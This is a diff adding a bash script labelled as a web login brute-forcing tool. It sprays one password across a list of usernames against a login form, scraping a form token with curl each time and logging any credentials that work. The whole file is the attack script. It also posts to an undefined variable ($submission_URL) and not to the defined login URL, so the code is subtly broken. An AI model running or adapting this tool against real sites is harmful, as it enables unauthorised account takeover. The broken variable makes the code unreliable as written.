@@ -1,0 +1,31 @@
+echo "*************************************************************"|tee -a brute-forcer.log
+echo "Web Login Brute Forcing Tool by @sw@mp_f0x"|tee -a brute-forcer.log
+echo "*************************************************************"|tee -a brute-forcer.log
+
+#settings
+password=Password1
+count=0
+form_URL=https://www.client.com/displaylogin
+login_URL=https://www.client.com/login
+
+echo "Beginning brute force against $form_URL"|tee -a brute-forcer.log
+echo ""|tee -a brute-forcer.log
+for name in $(cat usernames.txt);
+	do ((count++))
+	form_token=$(curl -s $form_URL|awk -F"\"" '/login.form.token/{print $2}')
+	result=$(curl -s --data "pass=$password&user=$name&uid=$form_token" $submission_URL | grep "Error:")
+	if [ -z "$result" ]
+	then
+		echo "[+]$count. Success! $name:$password"|tee -a brute-forcer.log
+	else
+		echo "[-]$count. $name Failed." |tee -a brute-forcer.log
+	fi
+done
+
+echo "Finished."|tee -a brute-forcer.log
+echo ""|tee -a brute-forcer.log
+echo "=============================================================="|tee -a brute-forcer.log
+echo ""|tee -a brute-forcer.log
+echo "The following credentials were found:"|tee -a brute-forcer.log
+echo ""|tee -a brute-forcer.log
+grep 'Success' brute-forcer.log
